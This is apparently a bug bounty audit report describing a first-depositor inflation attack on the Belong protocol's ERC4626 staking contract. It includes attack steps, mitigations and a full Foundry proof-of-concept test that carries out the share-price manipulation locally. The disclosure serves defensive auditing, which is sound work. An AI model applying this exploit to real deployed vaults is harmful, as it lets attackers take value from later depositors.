# 57809 sc critical inflation of shares in staking contract

**Submitted on Oct 29th 2025 at 01:16:27 UTC by @siddhu for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57809
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A critical cross-contract vulnerability exists between `BelongCheckIn.sol` and `Staking.sol` that enables malicious venues to execute devastating first-depositor inflation attacks. This vulnerability allows malicious venues to exploit their legitimate access to LONG tokens (received through protocol operations) to manipulate the Staking contract's share price by directly transferring assets, resulting in complete loss of funds for subsequent depositors. The attack leverages the interaction between `BelongCheckIn` functional mechanisms like `payToVenue` and ERC4626 staking implementation flaws.

## Vulnerability Details

### Cross-Contract Attack Vector

This vulnerability exploits the interaction between two protocol components:

**BelongCheckIn Contract**: Venues receive LONG tokens through legitimate customer payment operations:

```solidity
// From BelongCheckIn.sol - venues receive LONG directly from customer payments
if (rules.longPaymentType == LongPaymentTypes.AutoStake) {
    _storage.contracts.staking.deposit(longAmount, customerInfo.venueToPayFor);
} else if (rules.longPaymentType == LongPaymentTypes.AutoConvert) {
    _swapLONGtoUSDC(customerInfo.venueToPayFor, longAmount);
} else {
    _storage.paymentsInfo.long.safeTransfer(customerInfo.venueToPayFor, longAmount); // DIRECT LONG TO VENUE
}
```

**Staking Contract**: Vulnerable to first-depositor inflation attacks due to ERC4626 implementation flaws.

### Attack Sequence

{% stepper %}
{% step %}

### LONG Token Accumulation

Malicious venue sets `longPaymentType = LongPaymentTypes.Direct` and receives LONG tokens directly from customer payments through the `payToVenue` function.
{% endstep %}

{% step %}

### First Depositor Advantage

Venue monitors Staking contract deployment and becomes the first depositor with minimal amount (1 wei).
{% endstep %}

{% step %}

### Share Price Manipulation

Venue directly transfers accumulated LONG tokens to Staking contract, artificially inflating `totalAssets()` without minting shares.
{% endstep %}

{% step %}

### Victim Exploitation

Innocent users deposit LONG tokens and receive disproportionately few shares due to inflated exchange rate.
{% endstep %}

{% step %}

### Complete Fund Theft / Inflated Amount

Due to rounding behavior, victims can receive 0 shares for their deposits or receive far fewer shares than the value deposited.

Formula: shares = assets × totalShares ÷ totalAssets and assets = shares × totalAssets ÷ totalShares
{% endstep %}
{% endstepper %}

## Impact Details

Victims receive fewer shares for the same deposit amount because the asset-to-share exchange rate has been artificially inflated by direct transfers to the vault, enabling attackers to extract value for minimal deposits.

## References

* **Vulnerable Contract**: `src/periphery/Staking.sol`
* **Test Case**: `test/Staking.t.sol::testFirstDepositorInflationAttack()`
* **ERC4626 Standard**: [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626)

### Recommended Mitigations

* Enforce substantial minimum deposits to make attacks economically unfeasible.
* Implement safeguards against direct asset transfers that bypass share minting (e.g., reject plain ERC20 transfers, account for token transfers in totalAssets calculations, or implement an onERC20Received hook that mints corresponding shares).
* Consider handling unexpected token transfers by reconciling balances and minting shares to the protocol or a designated address, or by rejecting transfers entirely.

## Proof of Concept

Actual test results show:

* Attacker deposits 1 wei → receives 1 share
* Attacker directly transfers LONG → inflates totalAssets
* Victim deposits LONG → receives far fewer shares (or 0 shares)
* Both shares worth different LONG each, attacker benefits massively

PoC test contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {LibClone} from "solady/src/utils/LibClone.sol";
import {MockV3Router, MockV3Quoter, MockV3Factory} from "test/MockToken/MockUniswapV3.sol";
import {CreditToken} from "src/tokens/CreditToken.sol";
import {Escrow} from "src/periphery/Escrow.sol";
import {Staking} from "src/periphery/Staking.sol";
import {MockERC20} from "test/MockToken/MockERC20.sol";
import {Factory} from "src/platform/Factory.sol";
import {LONG} from "src/tokens/LONG.sol";
import {BelongCheckIn} from "src/platform/BelongCheckIn.sol";
import {
    ERC1155Info,
    VenueRules,
    VenueInfo,
    PaymentTypes,
    BountyTypes,
    LongPaymentTypes,
    CustomerInfo
} from "src/Structures.sol";

/// @title Malicious Venue Inflation Attack PoC
/// @notice Demonstrates how a malicious venue can exploit the first depositor inflation attack
/// @dev This PoC shows the cross-contract vulnerability between BelongCheckIn and Staking
contract MaliciousVenueInflationAttackTest is Test {
    using LibClone for address;
    
    // Core contracts
    BelongCheckIn belongCheckIn;
    Staking stakingContract;
    Escrow escrowContract;
    Factory factoryContract;
    
    // Token contracts
    LONG longToken;
    MockERC20 usdcToken;
    CreditToken venueToken;
    CreditToken promoterToken;
    
    // Mock Uniswap contracts
    MockV3Factory mockFactory;
    MockV3Router mockRouter;
    MockV3Quoter mockQuoter;
    MockERC20 wethToken;
    
    // Test addresses
    address Batman = makeAddr("Batman");
    address maliciousVenue = makeAddr("maliciousVenue");
    address innocentUser = makeAddr("innocentUser");
    address treasury = makeAddr("treasury");
    
    function setUp() public {
        // Deploy mock contracts
        mockFactory = new MockV3Factory();
        mockRouter = new MockV3Router();
        mockQuoter = new MockV3Quoter();
        usdcToken = new MockERC20();
        wethToken = new MockERC20();
        
        // Deploy implementation contracts
        BelongCheckIn belongCheckInImpl = new BelongCheckIn();
        Staking stakingImpl = new Staking();
        Escrow escrowImpl = new Escrow();
        Factory factoryImpl = new Factory();
        CreditToken venueTokenImpl = new CreditToken();
        CreditToken promoterTokenImpl = new CreditToken();
        LONG longImpl = new LONG();
        
        // Deploy proxy contracts
        belongCheckIn = BelongCheckIn(address(belongCheckInImpl).deployDeterministicERC1967(bytes32(uint256(1))));
        stakingContract = Staking(address(stakingImpl).deployDeterministicERC1967(bytes32(uint256(2))));
        escrowContract = Escrow(address(escrowImpl).deployDeterministicERC1967(bytes32(uint256(3))));
        factoryContract = Factory(address(factoryImpl).deployDeterministicERC1967(bytes32(uint256(4))));
        venueToken = CreditToken(address(venueTokenImpl).deployDeterministicERC1967(bytes32(uint256(5))));
        promoterToken = CreditToken(address(promoterTokenImpl).deployDeterministicERC1967(bytes32(uint256(6))));
        longToken = LONG(address(longImpl).deployDeterministicERC1967(bytes32(uint256(7))));
        
        // Initialize LONG token
        longToken.initialize(Batman, Batman, Batman);
        
        // Initialize Staking contract
        stakingContract.initialize(Batman, address(usdcToken), address(longToken));
        
        // Initialize Escrow contract
        escrowContract.initialize(belongCheckIn);
        
        // Initialize Factory contract
        Factory.FactoryParameters memory factoryParams = Factory.FactoryParameters({
            platformAddress: Batman,
            signerAddress: Batman,
            defaultPaymentCurrency: address(usdcToken),
            platformCommission: 50,
            maxArraySize: 200,
            transferValidator: Batman
        });
        
        Factory.RoyaltiesParameters memory royaltiesParams = Factory.RoyaltiesParameters({
            amountToCreator: 8000,
            amountToPlatform: 2000
        });
        
        Factory.Implementations memory implementations = Factory.Implementations({
            accessToken: address(0),
            creditToken: address(0),
            royaltiesReceiver: address(0),
            vestingWallet: address(0)
        });
        
        uint16[5] memory referralPercentages = [3000, 2000, 1000, 500, 500];
        factoryContract.initialize(factoryParams, royaltiesParams, implementations, referralPercentages);
        
        // Initialize venue and promoter tokens
        ERC1155Info memory venueTokenInfo = ERC1155Info({
            name: "Venue Token",
            symbol: "VT",
            defaultAdmin: Batman,
            manager: Batman,
            minter: address(belongCheckIn),
            burner: address(belongCheckIn),
            uri: "https://venue.token",
            transferable: true
        });
        
        ERC1155Info memory promoterTokenInfo = ERC1155Info({
            name: "Promoter Token",
            symbol: "PT",
            defaultAdmin: Batman,
            manager: Batman,
            minter: address(belongCheckIn),
            burner: address(belongCheckIn),
            uri: "https://promoter.token",
            transferable: true
        });
        
        venueToken.initialize(venueTokenInfo);
        promoterToken.initialize(promoterTokenInfo);
        
        // Initialize BelongCheckIn
        BelongCheckIn.PaymentsInfo memory paymentsInfo = BelongCheckIn.PaymentsInfo({
            slippageBps: 500,
            swapPoolFees: 3000,
            swapV3Factory: address(mockFactory),
            swapV3Router: address(mockRouter),
            swapV3Quoter: address(mockQuoter),
            wNativeCurrency: address(wethToken),
        usdc: address(usdcToken),
            long: address(longToken),
            maxPriceFeedDelay: 3600
        });
        
        belongCheckIn.initialize(Batman, paymentsInfo);
        
           // Set contracts in BelongCheckIn
        BelongCheckIn.Contracts memory contracts = BelongCheckIn.Contracts({
            factory: factoryContract,
            escrow: escrowContract,
            staking: stakingContract,
            venueToken: venueToken,
            promoterToken: promoterToken,
            longPF: 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 // ETH/USD feed
        });
        
        vm.prank(Batman);
        belongCheckIn.setContracts(contracts);
        
        // Setup tokens for testing - use 18 decimals like in working test
        usdcToken.mint(maliciousVenue, 10000 ether);
        usdcToken.mint(innocentUser, 5000 ether);
        
        // Give LONG tokens to customers and innocent user for realistic scenario
        vm.startPrank(Batman);
        longToken.transfer(makeAddr("customer1"), 200e18);
        longToken.transfer(makeAddr("customer2"), 300e18);
        longToken.transfer(innocentUser, 500e18);
          vm.stopPrank();
    }
    
    function testMaliciousVenueInflationAttack() public {
        // STEP 1: Simulate venue accumulating LONG tokens through customer payments
        // (In reality, this happens through payToVenue function with longPaymentType = Direct)
        // For PoC simplicity, i directly give venue LONG tokens to demonstrate the attack
        
        vm.startPrank(Batman);
          longToken.transfer(maliciousVenue, 100e18); // Venue accumulated 100 LONG from customers
        vm.stopPrank();
        
        console.log("Venue LONG balance (simulating from customer payments):", longToken.balanceOf(maliciousVenue));
        
        // STEP 2: Malicious venue becomes first depositor in Staking with 1 wei
    vm.startPrank(maliciousVenue);
        longToken.approve(address(stakingContract), type(uint256).max);
        uint256 attackerShares = stakingContract.deposit(1, maliciousVenue);
        vm.stopPrank();
        
        // STEP 3: Malicious venue directly transfers accumulated LONG to inflate share price
        uint256 venueBalance = longToken.balanceOf(maliciousVenue);
        uint256 inflationAmount = venueBalance - 1; // Use almost all balance (keep 1 wei)
        vm.prank(maliciousVenue);
        longToken.transfer(address(stakingContract), inflationAmount);
        
        console.log("Venue transferred LONG for inflation:", inflationAmount);
        
        // STEP 4: Innocent user deposits and gets screwed
        vm.startPrank(innocentUser);
        longToken.approve(address(stakingContract), type(uint256).max);
        uint256 victimShares = stakingContract.deposit(50e18, innocentUser);
        vm.stopPrank();
        
        // STEP 5: Calculate the damage
        uint256 attackerShareValue = stakingContract.previewRedeem(attackerShares);
        uint256 victimShareValue = stakingContract.previewRedeem(victimShares);
        
        // Debug logs
        console.log("Total assets in staking:", stakingContract.totalAssets());
        console.log("Total shares in staking:", stakingContract.totalSupply());
        console.log("Attacker shares:", attackerShares);
        console.log("Victim shares:", victimShares);
        console.log("Attacker share value:", attackerShareValue);
        console.log("Victim share value:", victimShareValue);
        
        // STEP 6: Prove the attack worked
        // The attack is successful when:
        // - Attacker deposited 1 wei but got same shares as victim who deposited 50 LONG
        // - This means attacker gets 50 LONG worth of value for 1 wei investment
               
        if (victimShares == 0) {
            console.log(" Victim got 0 shares -fund loss");
        } else if (attackerShares == victimShares) {
            // Both got same shares despite vastly different deposits - this is the attack!
           
                console.log("Attacker share value per wei:", attackerShareValue);
            console.log("Victim share valu per LONG:", victimShareValue / 50e18);
            uint256 attackerROI = (attackerShareValue * 100) / 1;
            // Attacker got massive value for tiny investment            
            assertTrue(attackerROI > 1000000, "Attacks successful: attacker got massive ROI");
        }   else {
            console.log("Attack failed");
        }
    }
}
```
